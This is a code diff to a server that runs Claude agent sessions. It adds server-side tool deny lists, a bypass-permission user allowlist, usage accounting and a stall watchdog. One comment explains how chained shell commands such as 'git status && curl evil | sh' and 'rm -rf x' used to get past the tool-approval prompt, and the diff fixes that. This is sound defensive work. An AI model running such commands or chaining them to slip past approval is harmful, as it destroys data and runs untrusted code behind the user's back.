@@ -19,6 +19,8 @@ import path from 'path';
 
 import { query } from '@anthropic-ai/claude-agent-sdk';
 
+import { createLogger } from '@/shared/logger.js';
+
 import { buildClaudeUserContent, normalizeImageDescriptors } from './shared/image-attachments.js';
 import {
   changedFilesSince,
@@ -41,9 +43,12 @@ import {
   notifyRunStopped,
   notifyUserIfEnabled
 } from './services/notification-orchestrator.js';
+import { usageRecordsDb } from './modules/database/index.js';
 import { sessionsService } from './modules/providers/services/sessions.service.js';
 import { providerAuthService } from './modules/providers/services/provider-auth.service.js';
 import { createCompleteMessage, createNormalizedMessage } from './shared/utils.js';
+
+const log = createLogger('sdk');
 
 const activeSessions = new Map();
 const pendingToolApprovals = new Map();
@@ -101,7 +106,7 @@ const ONESHOT_APPROVAL_TIMEOUT_MS = (() => {
  * ```js
  * if (mode === "bypassPermissions" || flag) {
  *   if (process.getuid?.() === 0 && process.env.IS_SANDBOX !== "1" && !CLAUDE_CODE_BUBBLEWRAP) {
- *     console.error("--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons");
+ *     log.error("--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons");
  *     process.exit(1);
  *   }
  * }
@@ -116,6 +121,34 @@ const ONESHOT_APPROVAL_TIMEOUT_MS = (() => {
  * @param {string} permissionMode 本轮实际生效的权限模式
  * @returns {string|null}
  */
+/**
+ * `PRISM_FORCED_DENY_TOOLS`:运维强制禁用的工具,逗号分隔。
+ *
+ * 每次调用都现读环境变量,不缓存 —— 这不是热路径(一轮一次),而现读意味着
+ * 改配置重启即生效,不用担心某个模块缓存了旧值。
+ */
+export function readForcedDenyTools(env = process.env) {
+  const raw = typeof env.PRISM_FORCED_DENY_TOOLS === 'string' ? env.PRISM_FORCED_DENY_TOOLS : '';
+  return raw.split(',').map((name) => name.trim()).filter(Boolean);
+}
+
+/**
+ * `PRISM_ALLOW_BYPASS_USERS`:允许使用 bypassPermissions 的用户名(小写归一)。
+ *
+ * 返回 `null` 表示**没有配**,语义是"不限制"(维持升级前的行为);
+ * 返回空 Set 表示配了但为空,语义是"谁都不许" —— 两者必须分得开,
+ * 所以不能用空数组同时表示这两件事。
+ *
+ * 小写归一与 `isRootUser` 同口径:用户名在这个系统里是大小写不敏感的
+ * (users.username 是 COLLATE NOCASE),名单不跟着归一就会出现
+ * "配了 Alice、alice 却不在名单里"。
+ */
+export function readBypassAllowlist(env = process.env) {
+  const raw = env.PRISM_ALLOW_BYPASS_USERS;
+  if (typeof raw !== 'string' || !raw.trim()) return null;
+  return new Set(raw.split(',').map((name) => name.trim().toLowerCase()).filter(Boolean));
+}
+
 export function describeBypassUnderRoot(permissionMode) {
   if (permissionMode !== 'bypassPermissions') return null;
   if (typeof process.getuid !== 'function' || process.getuid() !== 0) return null;
@@ -154,7 +187,7 @@ function sendPermissionRequest(writer, message, { toolName, sessionId }) {
   if (typeof writer?.sendAndCountDelivered === 'function') {
     const delivered = writer.sendAndCountDelivered(message);
     if (delivered === 0) {
-      console.warn(
+      log.warn(
         `[Claude SDK] 审批请求没有送达任何浏览器 (tool=${toolName}, session=${sessionId || 'none'}) —— `
         + '会一直挂着,等用户重连或切回该会话时由 pendingPermissions 补上。',
       );
@@ -318,7 +351,7 @@ function cancelPendingApprovalsForSession(appSessionId, reason = 'cancelled') {
     } catch { /* 单条失败不影响其余 */ }
   }
   if (cancelled > 0) {
-    console.warn(`[Claude SDK] Cancelled ${cancelled} pending tool approval(s) for session ${appSessionId} (${reason})`);
+    log.warn(`[Claude SDK] Cancelled ${cancelled} pending tool approval(s) for session ${appSessionId} (${reason})`);
   }
   return cancelled;
 }
@@ -392,10 +425,70 @@ function matchesToolPermission(entry, toolName, input) {
       return false;
     }
 
-    return command.startsWith(allowedPrefix);
+    /**
+     * fj:**每一段**子命令都要命中,不是整串前缀匹配。
+     *
+     * 原来是 `command.startsWith(allowedPrefix)`。用户批准一次 `git status` 会
+     * 生成条目 `Bash(git status:*)`,此后 `git status; rm -rf x`、
+     * `git status && curl evil | sh` 都以那个前缀开头 —— **自动放行,确认框不再出现**。
+     * 也就是说"我允许过 git status"被悄悄读成了"我允许过任意 shell"。
+     *
+     * 拆分只按 shell 的控制操作符,不试图理解 shell 语法(那是另一个坑)。
+     * 拆不动的复杂形状(反引号、$() 之类)照旧只能整段比,但那种命令本来就该
+     * 让用户看一眼确认框。
+     */
+    return splitShellSegments(command).every((segment) => segment.startsWith(allowedPrefix));
   }
 
   return false;
+}
+
+/**
+ * 把一条 shell 命令按控制操作符拆成子命令。
+ *
+ * 只认 `;` `&&` `||` `|` `&` 和换行 —— 这几个是"再跑一条命令"的入口。引号里的
+ * 同名字符不算(`echo "a; b"` 是一条命令),所以要跟着引号状态走。
+ */
+export function splitShellSegments(command) {
+  const segments = [];
+  let current = '';
+  let quote = null;
+  for (let i = 0; i < command.length; i += 1) {
+    const ch = command[i];
+    if (quote) {
+      // 反斜杠转义只在双引号里生效(单引号里反斜杠是字面量)
+      if (quote === '"' && ch === '\\' && i + 1 < command.length) {
+        current += ch + command[i + 1];
+        i += 1;
+        continue;
+      }
+      if (ch === quote) quote = null;
+      current += ch;
+      continue;
+    }
+    if (ch === '"' || ch === "'") {
+      quote = ch;
+      current += ch;
+      continue;
+    }
+    const two = command.slice(i, i + 2);
+    if (two === '&&' || two === '||') {
+      segments.push(current);
+      current = '';
+      i += 1;
+      continue;
+    }
+    if (ch === ';' || ch === '|' || ch === '&' || ch === '\n') {
+      segments.push(current);
+      current = '';
+      continue;
+    }
+    current += ch;
+  }
+  segments.push(current);
+  // 空段(`a;;b`、结尾的 `;`)不参与判定 —— 它们不执行任何东西。
+  const meaningful = segments.map((segment) => segment.trim()).filter(Boolean);
+  return meaningful.length > 0 ? meaningful : [command.trim()];
 }
 
 /**
@@ -473,6 +566,34 @@ function mapCliOptionsToSDK(options = {}, stderrTail = null) {
     sdkOptions.permissionMode = 'bypassPermissions';
   }
 
+  /**
+   * 服务端强制的 bypass 白名单。
+   *
+   * `bypassPermissions` 的意思是"这一轮所有工具调用都不弹确认框" —— 在多用户部署里,
+   * 这个档位**在聊天框的下拉里人人可选**,定时任务的 `permission_mode` 更是默认就用它。
+   * `.env.example` 里那段关于 `IS_SANDBOX` 的注释已经把代价写清楚了:
+   * 放行等于每个登录用户都拿到不受限的执行权限。
+   *
+   * 而客户端的权限清单存在**浏览器 localStorage** 里 —— 那是用户自己的偏好,
+   * 随时能清空。也就是说在此之前,"谁能用 bypass"这件事**服务端一句话都说不上**。
+   *
+   * 配了 `PRISM_ALLOW_BYPASS_USERS` 就只有名单里的人能用;没配则维持现状(全员可用),
+   * 免得升级上来的部署突然有人跑不了任务。降级到 `acceptEdits` 而不是直接拒绝:
+   * 拒绝会让一轮对话凭空失败,而降级只是把确认框还回来 —— 用户看得懂发生了什么。
+   */
+  // fj:两道闸都在 `applyServerToolPolicy` 里(常驻路径与这里共用同一份)。
+  //     单独写一遍的后果见那个函数的注释 —— 曾经只有这条路受管,主路径完全不受管。
+  const policed = applyServerToolPolicy(
+    sdkOptions.permissionMode,
+    settings.disallowedTools,
+    options.actorUsername,
+  );
+  if (policed.permissionMode === 'default') {
+    delete sdkOptions.permissionMode;
+  } else {
+    sdkOptions.permissionMode = policed.permissionMode;
+  }
+
   let allowedTools = [...(settings.allowedTools || [])];
 
   if (permissionMode === 'plan') {
@@ -491,7 +612,18 @@ function mapCliOptionsToSDK(options = {}, stderrTail = null) {
   // but being explicit ensures forward compatibility and clarity.
   sdkOptions.tools = { type: 'preset', preset: 'claude_code' };
 
-  sdkOptions.disallowedTools = settings.disallowedTools || [];
+  /**
+   * 工具黑名单:客户端的 + **服务端强制的**。
+   *
+   * `settings.disallowedTools` 来自客户端偏好 —— 用户自己勾的,也就是用户自己能取消的。
+   * `PRISM_FORCED_DENY_TOOLS` 是运维配的,**无条件并进去**,客户端覆盖不掉。
+   *
+   * 用途很具体:多用户部署里想禁掉 `Bash` 或 `WebFetch` 这类"能跑出去"的工具时,
+   * 在此之前**没有任何服务端手段** —— 唯一的清单在浏览器 localStorage 里。
+   *
+   * 去重是为了 SDK 那边少一次无谓的比对,不是功能需要。
+   */
+  sdkOptions.disallowedTools = policed.disallowedTools;
 
   // 'default' 档省略 model(见 toSdkModel),CLI 按 settings 配置链自选;
   // effort 仍按别名(含 'default')查表,两者口径不同是有意的。
@@ -646,6 +778,73 @@ function resolveContextWindowTokens(runtime, sdkMessage) {
 }
 
 /**
+ * 一轮对话的 token 累加器。
+ *
+ * ## 为什么必须自己累加,不能直接读 result 帧
+ *
+ * `message.usage` 是**每次 API 调用**的用量。一轮对话里 Claude 可能调十几次
+ * (每用一次工具就再来一轮),而计费是按每次调用的 input+output 算的 ——
+ * 所以"这一轮花了多少 token"就是把这一轮里每条 assistant 消息的 usage 加起来。
+ *
+ * 只读 result 帧或者只读最后一条 assistant 消息,拿到的是**最后一次调用**的数字。
+ * 那个数字有它的用处(它约等于当前上下文占用,`/cost` 弹窗的进度条就是它),
+ * 但它**不是**这一轮的花费 —— 差可以是一个数量级。
+ * `usage.routes.ts` 里那个 `parseTokenUsageTotals` 名字叫 Totals 其实取的是最后一条,
+ * 别照着它写。
+ */
+function createUsageAccumulator() {
+  return { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheCreationTokens: 0, model: null };
+}
+
+/** 把一条 SDK 消息里的 usage 累加进去。不是 assistant 消息就原样返回。 */
+function accumulateUsage(accumulator, sdkMessage) {
+  if (!accumulator || !sdkMessage || typeof sdkMessage !== 'object') return;
+  const usage = sdkMessage.message?.usage;
+  if (!usage || typeof usage !== 'object') return;
+  accumulator.inputTokens += readNumber(usage.input_tokens ?? usage.inputTokens);
+  accumulator.outputTokens += readNumber(usage.output_tokens ?? usage.outputTokens);
+  accumulator.cacheReadTokens += readNumber(usage.cache_read_input_tokens ?? usage.cacheReadInputTokens);
+  accumulator.cacheCreationTokens += readNumber(usage.cache_creation_input_tokens ?? usage.cacheCreationInputTokens);
+  const model = sdkMessage.message?.model ?? sdkMessage.model;
+  if (typeof model === 'string' && model) accumulator.model = model;
+}
+
+/**
+ * 一轮结束,记一条账。
+ *
+ * 全程 try/catch 且**永远不抛**:台账是旁路数据,写在对话的收尾路径上。
+ * 一次磁盘满就让整轮对话报错,代价远大于丢一行账。
+ */
+function recordTurnUsage(accumulator, resultMessage, context) {
+  try {
+    if (!accumulator) return;
+    const costCumulative = readNumber(resultMessage?.total_cost_usd ?? resultMessage?.totalCostUsd);
+    // 一条 token 都没有、也没有费用 —— 空轮(比如立刻被中止),不记。
+    const hasTokens = accumulator.inputTokens + accumulator.outputTokens
+      + accumulator.cacheReadTokens + accumulator.cacheCreationTokens > 0;
+    if (!hasTokens && costCumulative <= 0) return;
+
+    usageRecordsDb.record({
+      sessionId: context.sessionId ?? null,
+      projectPath: context.projectPath ?? null,
+      userId: context.userId ?? null,
+      username: context.username ?? null,
+      provider: 'claude',
+      model: accumulator.model ?? context.model ?? null,
+      source: context.source ?? 'chat',
+      inputTokens: accumulator.inputTokens,
+      outputTokens: accumulator.outputTokens,
+      cacheReadTokens: accumulator.cacheReadTokens,
+      cacheCreationTokens: accumulator.cacheCreationTokens,
+      costUsdCumulative: costCumulative,
+      durationMs: context.durationMs ?? null,
+    });
+  } catch (error) {
+    log.error('[usage] 记账失败(不影响对话):', error?.message ?? error);
+  }
+}
+
+/**
  * Extracts token usage from SDK messages.
  * Prefers per-step `message.usage` (Claude message payload), then falls back
  * to result-level usage/modelUsage for compatibility across SDK versions.
@@ -776,7 +975,7 @@ async function loadMcpConfig(cwd) {
       const configContent = await fs.readFile(claudeConfigPath, 'utf8');
       claudeConfig = JSON.parse(configContent);
     } catch (error) {
-      console.error('Failed to parse ~/.claude.json:', error.message);
+      log.error('Failed to parse ~/.claude.json:', error.message);
       return null;
     }
 
@@ -804,7 +1003,7 @@ async function loadMcpConfig(cwd) {
     }
     return mcpServers;
   } catch (error) {
-    console.error('Error loading MCP config:', error.message);
+    log.error('Error loading MCP config:', error.message);
     return null;
   }
 }
@@ -823,6 +1022,25 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
   let capturedSessionId = sessionId;
   let sessionCreatedSent = false;
   const stderrTail = createStderrTail();
+
+  /**
+   * fj:**起跑之前**先看有没有被标记中止。
+   *
+   * 中止标记(`abortedSessionIds` / `runEntry.aborted`)只在收尾时被读到 ——
+   * 用来决定"要不要再发一条终止帧"。但用户完全可能在这一轮真正 spawn 起来
+   * **之前**就按了停止(建会话、releaseClaudeSession、加载 MCP 配置、
+   * 解析模型,这几步加起来能到秒级),那时标记已经打上,而进程照起、
+   * 整轮照跑 —— 用户看到的是"我按了停止,它却开始干活了"。
+   *
+   * 消费标记时用 `delete`(而不是 `has`),与本文件其它四处一致:
+   * 标记留着会让**下一条**消息也被判成已中止,那是更难查的一个坑。
+   */
+  const abortedBeforeStart = (sessionId ? abortedSessionIds.delete(sessionId) : false)
+    || Boolean(runEntry?.aborted);
+  if (abortedBeforeStart) {
+    log.info(`[Claude SDK] 回合在起跑前已被中止,不再启动(session=${sessionId || 'NEW'})`);
+    return;
+  }
 
   /**
    * dv:resume 一段对话之前,先把它**常驻着的那个 CLI 请下去**。
@@ -856,16 +1074,17 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
   };
 
   try {
+    // fj:同上 —— app 会话 id 优先(见 queryClaudeSDKPersistent 里的说明)。
     const resolvedModel = await providerModelsService.resolveResumeModel(
       'claude',
-      sessionId,
+      (typeof options.runId === 'string' && options.runId) || sessionId,
       options.model,
     );
     let effortModels = CLAUDE_FALLBACK_MODELS;
     try {
       effortModels = (await providerModelsService.getProviderModels('claude')).models;
     } catch (error) {
-      console.warn('[Claude SDK] Unable to load provider models for effort validation:', error);
+      log.warn('[Claude SDK] Unable to load provider models for effort validation:', error);
     }
 
     const sdkOptions = mapCliOptionsToSDK({
@@ -1020,7 +1239,7 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
       } catch (hookError) {
         // Older/newer SDK versions may not accept hook shapes yet.
         // Keep notification behavior operational via runtime events even if hook registration fails.
-        console.warn('Failed to initialize Claude query with hooks, retrying without hooks:', hookError?.message || hookError);
+        log.warn('Failed to initialize Claude query with hooks, retrying without hooks:', hookError?.message || hookError);
         delete sdkOptions.hooks;
         queryInstance = query({
           prompt: await createPrompt(),
@@ -1046,9 +1265,56 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
       addSession(capturedSessionId, queryInstance, ws, oneShotAbortController);
     }
 
+    /**
+     * 一次性路径的静默看门狗。
+     *
+     * 常驻路径有 idle / absolute / toolSilence 三档(见 `readTurnWatchdogConfig` 与
+     * `runPersistentTurn`),而这条路**一档都没有** —— 它服务的是外部 API、定时任务、
+     * 以及常驻池满时的降级回退。
+     *
+     * 子进程"停止吐东西但不退出"是真实存在的(常驻路径的注释明说:网关在两步之间断流)。
+     * 那时下面这个 `for await` 会永远挂着,后果是三重的:
+     *   - `activeOneShotFallbacks` 永不减 1,并发预算被吃掉一格;
+     *   - 该会话的 run 永远 running,网页端所有后续消息只能进 pendingSends、
+     *     30 分钟后过期 —— 用户看到消息发出去石沉大海;
+     *   - 同步 API 对该会话恒返 409。
+     * 而且**不会自愈**,除非有人手动去按停止。
+     *
+     * 判据用 idleMs(默认 60 分钟):流上每来一条消息就续期,到点 abort。
+     * 不用 absoluteMs —— 一次性路径跑的常是长任务(定时回归、批量分析),
+     * 给绝对上限等于给正常任务判死刑;而"一小时一个字都没吐"在任何口径下都是死了。
+     */
+    const oneShotWatchdogMs = readTurnWatchdogConfig().idleMs;
+    let oneShotWatchdog = null;
+    const clearOneShotWatchdog = () => {
+      if (oneShotWatchdog) { clearTimeout(oneShotWatchdog); oneShotWatchdog = null; }
+    };
+    const armOneShotWatchdog = () => {
+      if (!oneShotWatchdogMs) return; // 配 0 表示显式关掉
+      clearOneShotWatchdog();
+      oneShotWatchdog = setTimeout(() => {
+        log.warn(
+          `[claude-sdk] 一次性回合静默超过 ${oneShotWatchdogMs}ms,判定悬死并中止(session=${capturedSessionId || 'NEW'})`,
+        );
+        try { oneShotAbortController.abort(); } catch { /* best effort */ }
+      }, oneShotWatchdogMs);
+      // 看门狗不该把进程钉在事件循环里
+      if (typeof oneShotWatchdog.unref === 'function') oneShotWatchdog.unref();
+    };
+
+    // fg:这一轮的用量累加器(见 createUsageAccumulator 上面那段:
+    // 必须逐条累加,读 result 帧拿到的是最后一次 API 调用而不是整轮)。
+    const oneShotUsage = createUsageAccumulator();
+    const oneShotStartedAt = Date.now();
+    /** fj:result 帧报告的业务失败(见下面赋值处)。 */
+    let oneShotResultIsError = false;
+
     // Process streaming messages
-    console.log('Starting async generator loop for session:', capturedSessionId || 'NEW');
+    log.info('Starting async generator loop for session:', capturedSessionId || 'NEW');
+    armOneShotWatchdog();
+    try {
     for await (const message of queryInstance) {
+      armOneShotWatchdog(); // 有动静就续期
       // Capture session ID from first message
       if (message.session_id && !capturedSessionId) {
 
@@ -1088,6 +1354,40 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
       if (tokenBudgetData) {
         ws.send(createNormalizedMessage({ kind: 'status', text: 'token_budget', tokenBudget: tokenBudgetData, sessionId: capturedSessionId || sessionId || null, provider: 'claude' }));
       }
+
+      // fg:一轮的 token 逐条累加,result 帧到了就落一条账。
+      accumulateUsage(oneShotUsage, message);
+      if (message?.type === 'result' && !message?.parent_tool_use_id) {
+        /**
+         * fj:记下这一轮**业务上**成没成功。
+         *
+         * 收尾此前一律 `exitCode: 0` —— 只要迭代器没抛异常就算成功,而 SDK 的
+         * `result` 帧自己带着 `is_error` / `subtype`(比如超出轮次上限、
+         * 被 CLI 侧拒绝)。于是"模型没做完"和"模型做完了"对调用方(外部 API 的
+         * 同步响应、定时任务的运行记录)长得一模一样,失败被记成成功。
+         */
+        oneShotResultIsError = Boolean(message.is_error)
+          || (typeof message.subtype === 'string' && message.subtype !== 'success');
+        recordTurnUsage(oneShotUsage, message, {
+          // fj:同上 —— app 会话 id 优先(`options.runId` 就是它)。
+          sessionId: (typeof options.runId === 'string' && options.runId)
+            || capturedSessionId || sessionId || null,
+          projectPath: options.cwd ?? null,
+          userId: ws?.userId ?? null,
+          username: options.actorUsername ?? null,
+          model: options.model ?? null,
+          // 定时任务和外部 API 都走这条一次性路径 —— 记清楚是谁触发的,
+          // 否则"这个月的钱花哪了"只能看到一堆没有主语的行。
+          source: options.usageSource ?? 'chat',
+          durationMs: Date.now() - oneShotStartedAt,
+        });
+      }
+    }
+    } finally {
+      // 无论正常结束、抛错还是被中止,看门狗都必须撤掉 —— 留着它会在回合结束后
+      // 才触发,去 abort 一个已经不存在的控制器(无害但会打一行吓人的日志),
+      // 更要紧的是它持有闭包、拖着这一轮的对象不被回收。
+      clearOneShotWatchdog();
     }
 
     // Clean up session on completion
@@ -1101,20 +1401,25 @@ async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
     const wasAborted = (capturedSessionId ? abortedSessionIds.delete(capturedSessionId) : false)
       || Boolean(runEntry?.aborted);
     if (!wasAborted) {
-      ws.send(createCompleteMessage({ provider: 'claude', sessionId: capturedSessionId || sessionId || null, exitCode: 0 }));
+      // fj:业务失败要如实报出去,不能一律 0(见 oneShotResultIsError)。
+      ws.send(createCompleteMessage({
+        provider: 'claude',
+        sessionId: capturedSessionId || sessionId || null,
+        exitCode: oneShotResultIsError ? 1 : 0,
+      }));
     }
     notifyRunStopped({
       userId: ws?.userId || null,
       provider: 'claude',
       sessionId: capturedSessionId || sessionId || null,
       sessionName: sessionSummary,
-      stopReason: wasAborted ? 'aborted' : 'completed'
+      stopReason: wasAborted ? 'aborted' : (oneShotResultIsError ? 'failed' : 'completed'),
     });
     // Complete
 
   } catch (error) {
     // stderr 一起打出来 —— 单独一句 "exited with code 1" 在日志里定位不了任何东西。
-    console.error('SDK query error:', stderrTail.describe(error));
+    log.error('SDK query error:', stderrTail.describe(error));
 
     // Clean up session on error
     if (capturedSessionId) {
@@ -1231,7 +1536,7 @@ async function abortClaudeSDKSession(sessionId, context = {}) {
     if (context && typeof context.runId === 'string' && context.runId) {
       return abortClaudeSDKRun(context.runId);
     }
-    console.log(`Session ${sessionId} not found`);
+    log.info(`Session ${sessionId} not found`);
     return false;
   }
 
@@ -1240,7 +1545,7 @@ async function abortClaudeSDKSession(sessionId, context = {}) {
     : null;
 
   try {
-    console.log(`Aborting SDK session: ${sessionId}`);
+    log.info(`Aborting SDK session: ${sessionId}`);
 
     // Mark before interrupting so the run loop knows not to emit its own
     // terminal complete (the abort handler sends the aborted one). The
@@ -1255,7 +1560,7 @@ async function abortClaudeSDKSession(sessionId, context = {}) {
       // 协商超时/失败:升级为硬撕。abortController 直接拆 query + 杀子进程,
       // run 循环会以 AbortError 收尾(runEntry.aborted 已置,按中止归类)。
       if (session.abortController) {
-        console.error(
+        log.error(
           `[Claude SDK] interrupt failed for ${sessionId}, escalating to hard abort:`,
           interruptError?.message || interruptError,
         );
@@ -1275,7 +1580,7 @@ async function abortClaudeSDKSession(sessionId, context = {}) {
 
     return true;
   } catch (error) {
-    console.error(`Error aborting session ${sessionId}:`, error);
+    log.error(`Error aborting session ${sessionId}:`, error);
     // The run keeps going; let it emit its own terminal complete.
     abortedSessionIds.delete(sessionId);
     if (runEntry) runEntry.aborted = false;
@@ -1714,32 +2019,109 @@ function normalizedPermissionMode(options, settings) {
     : 'default';
 }
 
-function runtimeSettingsFromOptions(options) {
+/**
+ * fj:服务端强制策略 —— **两条执行路径共用的唯一一份**。
+ *
+ * 此前 `PRISM_ALLOW_BYPASS_USERS` 与 `PRISM_FORCED_DENY_TOOLS` 只写在
+ * `mapCliOptionsToSDK` 里,而那个函数只被 `queryClaudeSDKOnce` 调用 ——
+ * 也就是说两道闸**只管外部 API,完全不管网页聊天**(默认走常驻 runtime,
+ * `PERSISTENT_ENABLED` 默认 true)。
+ *
+ * 后果不是"少了一层加固",是 `.env.example` 白纸黑字承诺的两件事在主路径上
+ * 一件都不成立:配了 `PRISM_FORCED_DENY_TOOLS=Bash` 之后 Bash 照常可用;
+ * 任何用户在下拉里选「跳过权限」,常驻 runtime 直接以 bypassPermissions 起进程,
+ * 不降级、不打 warn。而运维会以为自己已经加固过了 —— 这比没有这个功能更糟。
+ *
+ * 反差还很反直觉:**越是交互式、人人可用的那条路,管得越松**。
+ *
+ * 所以策略下沉到这里,`mapCliOptionsToSDK` 改成复用它,一份判据两条路。
+ */
+export function applyServerToolPolicy(mode, disallowedTools, actorUsername) {
+  let effectiveMode = mode;
+
+  const bypassAllowlist = readBypassAllowlist();
+  if (
+    effectiveMode === 'bypassPermissions'
+    && bypassAllowlist !== null
+    && !bypassAllowlist.has(String(actorUsername ?? '').trim().toLowerCase())
+  ) {
+    log.warn(
+      `[claude-sdk] 「${actorUsername ?? '未知用户'}」不在 PRISM_ALLOW_BYPASS_USERS 名单里,`
+      + '本轮从 bypassPermissions 降级为 acceptEdits',
+    );
+    // 降级而不是拒绝:拒绝会让一轮对话凭空失败,降级只是把确认框还回来。
+    effectiveMode = 'acceptEdits';
+  }
+
+  return {
+    permissionMode: effectiveMode,
+    // 客户端的 + 服务端强制的。后者无条件并进去,客户端覆盖不掉。
+    disallowedTools: [...new Set([...(disallowedTools || []), ...readForcedDenyTools()])],
+  };
+}
+
+/**
+ * 导出仅为可测:常驻路径的 settings **只**从这里出。不导出的话,"强制策略在常驻
+ * 路径上生效"这条就只能靠读码保证 —— 而它此前正是这么漏掉的。
+ */
+export function runtimeSettingsFromOptions(options) {
   const toolsSettings = options.toolsSettings || {
     allowedTools: [],
     disallowedTools: [],
     skipPermissions: false,
   };
-  const permissionMode = normalizedPermissionMode(options, toolsSettings);
+  const requestedMode = normalizedPermissionMode(options, toolsSettings);
   const allowedTools = [...(toolsSettings.allowedTools || [])];
-  if (permissionMode === 'plan') {
+  if (requestedMode === 'plan') {
     for (const tool of ['Read', 'Task', 'exit_plan_mode', 'TodoRead', 'TodoWrite', 'WebFetch', 'WebSearch']) {
       if (!allowedTools.includes(tool)) allowedTools.push(tool);
     }
   }
+  // fj:强制策略在这里落地 —— 常驻与一次性两条路都从这个函数拿 settings。
+  const policed = applyServerToolPolicy(
+    requestedMode,
+    toolsSettings.disallowedTools,
+    options.actorUsername,
+  );
   return {
-    permissionMode,
+    permissionMode: policed.permissionMode,
     allowedTools,
-    disallowedTools: [...(toolsSettings.disallowedTools || [])],
+    disallowedTools: policed.disallowedTools,
   };
 }
 
 /** Config axes that force a runtime rebuild (everything else is dynamic). */
+/**
+ * fj:「上一轮还在收尾」的等待窗口。见 runtimeForSend 里的说明。
+ * 2 秒足够覆盖 interrupt 之后 CLI 拆流的时间,又不会让真正的并发双发久等。
+ */
+const TURN_SETTLE_GRACE_MS = 2000;
+
 function persistentRuntimeSignature(options, settings) {
   return JSON.stringify({
     cwd: options.cwd ? path.resolve(options.cwd) : '',
     effort: options.resolvedEffort || '',
     bypass: settings.permissionMode === 'bypassPermissions',
+    /**
+     * fj:工具清单也是**冻结项**,必须进签名。
+     *
+     * `allowedTools` / `disallowedTools` 在 SDK 里是 `--allowedTools` /
+     * `--disallowedTools` **命令行参数**,子进程 spawn 时定死。之后改
+     * `runtime.settings.*` 只改了 Prism 自己那一层 —— 而 CLI 的规则命中时
+     * **根本不会发 `can_use_tool` 控制请求**,Prism 那层就被短路掉了。
+     *
+     * 后果是单向的、因而极难自查:**新增**一条允许没问题(CLI 不认识就来问,
+     * Prism 按新清单放行),**撤销**一条却不生效 —— 用户在设置里删掉
+     * `Bash(rm:*)`,同一段对话里继续发消息,CLI 拿着 spawn 时那份清单继续自动
+     * 放行,确认框不会回来,最长可持续到 30 分钟空闲回收之后。
+     * 共享会话还有个变体:A 授权过 X,B 往同一会话发消息(runtime 按 provider
+     * 会话 id 索引、键里没有用户),B 的回合里 X 被自动放行,而 B 从没允许过它。
+     *
+     * 进签名 = 清单一变就 dispose+resume 重建,和 settings.json 变更走同一条
+     * 现成的路。代价是一次 resume,而改工具清单是低频操作。
+     */
+    allowedTools: [...(settings.allowedTools || [])].sort(),
+    disallowedTools: [...(settings.disallowedTools || [])].sort(),
   });
 }
 
@@ -1890,6 +2272,28 @@ function buildPersistentSdkOptions(options, runtime) {
       }
     });
 
+    /**
+     * fj:**答复之后也要广播一条终态。**
+     *
+     * `permission_cancelled` 只在超时/取消时发,而"点了允许/拒绝"没有任何出站帧 ——
+     * 前端靠 `handlePermissionResponse` 自己乐观清掉本地那一条。于是:
+     *   - 同一个人开着的**第二个标签页**上那个确认框一直留着(它没发过那次答复),
+     *     点它只会得到一个找不到 resolver 的静默失败;
+     *   - 侧栏的「有待批」角标同理不会消。
+     *
+     * 补一条与 `permission_cancelled` 同形的帧,reason 说明是怎么了结的。
+     * 它不进重放缓冲(见 registry),所以不会在重连时把答复过的框推回来。
+     */
+    turn.ws.send(createNormalizedMessage({
+      kind: 'permission_cancelled',
+      requestId,
+      reason: decision === null
+        ? 'timeout'
+        : decision.cancelled ? 'cancelled' : (decision.allow ? 'answered_allow' : 'answered_deny'),
+      sessionId: sid,
+      provider: 'claude',
+    }));
+
     if (!decision) return { behavior: 'deny', message: APPROVAL_UNANSWERED_MESSAGE };
     if (decision.cancelled) return { behavior: 'deny', message: 'Permission request cancelled' };
     if (decision.allow) {
@@ -1936,7 +2340,7 @@ async function readPersistentRuntime(runtime) {
       const turn = runtime.turn;
       if (!turn) {
         if (toolDelta.removes.length > 0 && runtime.pendingToolUses.size === 0) {
-          console.log(`[Claude SDK] Runtime ${runtime.key} drained its pending tools after the turn ended; reusable again`);
+          log.info(`[Claude SDK] Runtime ${runtime.key} drained its pending tools after the turn ended; reusable again`);
         }
         continue; // stray events between turns
       }
@@ -2019,7 +2423,38 @@ async function readPersistentRuntime(runtime) {
         turn.ws.send(createNormalizedMessage({ kind: 'status', text: 'token_budget', tokenBudget: tokenBudgetData, sessionId: sid, provider: 'claude' }));
       }
 
+      // fg:累加要**包括 internal 回合**(自动压缩)。压缩是真花钱的,
+      // 界面上不显示不等于账上不该有 —— 恰恰相反,"为什么这个月贵了"
+      // 很可能答案就是压缩跑得多。
+      accumulateUsage(turn.usage, message);
+
       if (isTurnResult(message)) {
+        recordTurnUsage(turn.usage, message, {
+          /**
+           * fj:落 **app 会话 id**,不是 provider 原生 id。
+           *
+           * `/cost` 那一行台账查的是 `totalsForSession(context.sessionId)`,而
+           * `context.sessionId` 来自前端的 `currentSessionId` —— 前端**只认识
+           * app 会话 id**(`session_created` 帧被 writer 整个吞掉,原生 id 到不了
+           * 浏览器)。网页新建的会话 `provider_session_id` 先是 NULL、之后由 CLI
+           * 生成一个 uuid 补上,两个 id 必然不同。
+           *
+           * 于是 fh 轮新加的「台账累计(含历史)」对网页会话**恒为 null** ——
+           * 这个功能想解决的问题原封不动地还在(而定时任务因为 app id == provider id
+           * 反而能查到,更让人摸不着头脑)。
+           *
+           * 落库的数据本身没错,`/api/usage/*` 那两个不按会话过滤的页面一直正常。
+           */
+          sessionId: runtime.appSessionId || runtime.sessionId || turn.capturedSessionId || null,
+          projectPath: runtime.projectPath ?? null,
+          userId: runtime.ownerUserId ?? null,
+          username: runtime.actorUsername ?? null,
+          model: runtime.currentModel ?? null,
+          // 压缩单独一档。它是真花钱的,而且"这个月为什么贵了"的答案
+          // 很可能就是压缩跑得多 —— 混进 chat 里就永远看不出来。
+          source: turn.internal ? 'compact' : 'chat',
+          durationMs: Date.now() - turn.startedAtMs,
+        });
         finishPersistentTurn(runtime, { resultMessage: message });
       }
     }
@@ -2028,7 +2463,7 @@ async function readPersistentRuntime(runtime) {
